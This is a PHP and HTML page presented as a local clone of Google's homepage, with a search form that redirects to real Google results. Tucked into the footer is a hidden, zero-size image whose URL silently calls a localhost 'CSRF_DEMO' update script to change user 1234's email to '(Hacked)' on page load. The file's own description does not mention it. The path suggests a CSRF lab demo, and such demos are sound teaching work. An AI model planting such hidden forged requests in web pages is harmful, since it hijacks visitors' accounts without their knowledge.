<?php
// google-homepage.php
// A local clone of Google's homepage. Submitting a search redirects
// (server-side) to Google's real search results, so the search itself
// still works exactly as it does on google.com.

$query = isset($_GET['q']) ? trim($_GET['q']) : '';
$feelingLucky = isset($_GET['btnI']);

if ($query !== '') {
    if ($feelingLucky) {
        header('Location: https://www.google.com/search?q=' . urlencode($query) . '&btnI=1');
    } else {
        header('Location: https://www.google.com/search?q=' . urlencode($query));
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Google</title>
<style>
  * { box-sizing: border-box; }
  html, body {
    height: 100%;
    margin: 0;
  }
  body {
    font-family: arial, sans-serif;
    display: flex;
    flex-direction: column;
    background: #fff;
    color: #202124;
  }

  /* ---- top nav ---- */
  .topnav {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 20px 28px 0;
    font-size: 13px;
  }
  .topnav .left a {
    color: #5f6368;
    text-decoration: none;
    margin-right: 28px;
  }
  .topnav .left a:hover { text-decoration: underline; }
  .topnav .right {
    display: flex;
    align-items: center;
  }
  .topnav .right a.textlink {
    color: #5f6368;
    text-decoration: none;
    margin-right: 22px;
  }
  .topnav .right a.textlink:hover { text-decoration: underline; }
  .apps-grid {
    width: 40px;
    height: 40px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin-right: 8px;
    cursor: pointer;
  }
  .apps-grid:hover { background: #f1f3f4; }
  .signin-btn {
    background: #1a73e8;
    color: #fff;
    border: none;
    border-radius: 4px;
    padding: 9px 23px;
    font-size: 14px;
    font-weight: 500;
    text-decoration: none;
    cursor: pointer;
  }
  .signin-btn:hover { background: #1765cc; }

  /* ---- center content ---- */
  .center {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    margin-top: -60px;
  }
  .logo img {
    width: 272px;
    display: block;
  }
  form {
    margin-top: 25px;
    width: 100%;
    max-width: 584px;
    padding: 0 20px;
  }
  .search-box {
    display: flex;
    align-items: center;
    gap: 10px;
    border: 1px solid #dfe1e5;
    border-radius: 24px;
    padding: 5px 14px;
    height: 44px;
  }
  .search-box:hover, .search-box:focus-within {
    box-shadow: 0 1px 6px rgba(32,33,36,.28);
    border-color: rgba(223,225,229,0);
  }
  .search-box svg { flex-shrink: 0; color: #9aa0a6; }
  .search-box input[type="text"] {
    flex: 1;
    border: none;
    outline: none;
    font-size: 16px;
    background: transparent;
  }
  .divider {
    width: 1px;
    height: 24px;
    background: #dadce0;
  }
  .ai-mode {
    display: flex;
    align-items: center;
    gap: 5px;
    background: #f0f4f9;
    border-radius: 20px;
    padding: 7px 14px 7px 10px;
    font-size: 14px;
    color: #4f5560;
    cursor: pointer;
    white-space: nowrap;
  }
  .ai-mode:hover { background: #e4e9f0; }

  .buttons {
    text-align: center;
    margin-top: 25px;
  }
  .buttons input[type="submit"] {
    background-color: #f8f9fa;
    border: 1px solid #f8f9fa;
    border-radius: 4px;
    color: #3c4043;
    font-size: 14px;
    margin: 11px 4px;
    padding: 0 16px;
    line-height: 27px;
    height: 36px;
    min-width: 54px;
    text-align: center;
    cursor: pointer;
  }
  .buttons input[type="submit"]:hover {
    box-shadow: 0 1px 1px rgba(0,0,0,.1);
    border: 1px solid #dadce0;
    color: #202124;
  }

  /* ---- footer ---- */
  .location {
    background: #f2f2f2;
    color: #70757a;
    font-size: 15px;
    padding: 14px 28px;
    border-bottom: 1px solid #e4e4e4;
  }
  footer.links {
    background: #f2f2f2;
    display: flex;
    justify-content: space-between;
    padding: 14px 28px;
    font-size: 15px;
    color: #70757a;
  }
  footer.links a {
    color: #70757a;
    text-decoration: none;
    margin-right: 26px;
  }
  footer.links a:hover { text-decoration: underline; }
  footer.links .right a { margin-right: 0; margin-left: 26px; }
</style>
</head>
<body>

  <div class="topnav">
    <div class="left">
      <a href="#">About</a>
      <a href="#">Store</a>
    </div>
    <div class="right">
      <a class="textlink" href="#">Gmail</a>
      <a class="textlink" href="#">Images</a>
      <div class="apps-grid">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="#5f6368">
          <circle cx="5" cy="5" r="2"/><circle cx="12" cy="5" r="2"/><circle cx="19" cy="5" r="2"/>
          <circle cx="5" cy="12" r="2"/><circle cx="12" cy="12" r="2"/><circle cx="19" cy="12" r="2"/>
          <circle cx="5" cy="19" r="2"/><circle cx="12" cy="19" r="2"/><circle cx="19" cy="19" r="2"/>
        </svg>
      </div>
      <a class="signin-btn" href="#">Sign in</a>
    </div>
  </div>

  <div class="center">
    <div class="logo">
      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
    </div>

    <form action="" method="GET" autocomplete="off">
      <div class="search-box">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
        </svg>
        <input type="text" name="q" autofocus>
        <svg width="20" height="20" viewBox="0 0 24 24" fill="#4285F4">
          <path d="M12 14a3 3 0 0 0 3-3V6a3 3 0 0 0-6 0v5a3 3 0 0 0 3 3z"/>
          <path fill="#34A853" d="M19 11a7 7 0 0 1-14 0H3a9 9 0 0 0 8 8.94V23h2v-3.06A9 9 0 0 0 21 11h-2z"/>
        </svg>
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#4285F4" stroke-width="2">
          <path d="M4 8V6a2 2 0 0 1 2-2h2M20 8V6a2 2 0 0 1-2-2h-2M4 16v2a2 2 0 0 0 2 2h2M20 16v2a2 2 0 0 1-2 2h-2"/>
          <circle cx="12" cy="12" r="3.5"/>
        </svg>
        <div class="divider"></div>
        <div class="ai-mode">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="#4285F4">
            <path d="M12 2l1.8 5.6L19 9l-5.2 1.9L12 16l-1.8-5.1L5 9l5.2-1.4L12 2z"/>
          </svg>
          AI Mode
        </div>
      </div>
      <div class="buttons">
        <input type="submit" value="Google Search">
        <input type="submit" name="btnI" value="I'm Feeling Lucky">
      </div>
    </form>
  </div>

  <div class="location">Australia</div>
  <footer class="links">
    <div class="left">
      <a href="#">Advertising</a>
      <a href="#">Business</a>
      <a href="#">How Search works</a>
    </div>
    <div class="right">
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
      <a href="#">Settings</a>
      <img src="http://localhost/CSRF_DEMO/update.php/?user_id=1234&new_email=(Hacked)" style="display: none;">
    </div>
  </footer>

</body>
</html>
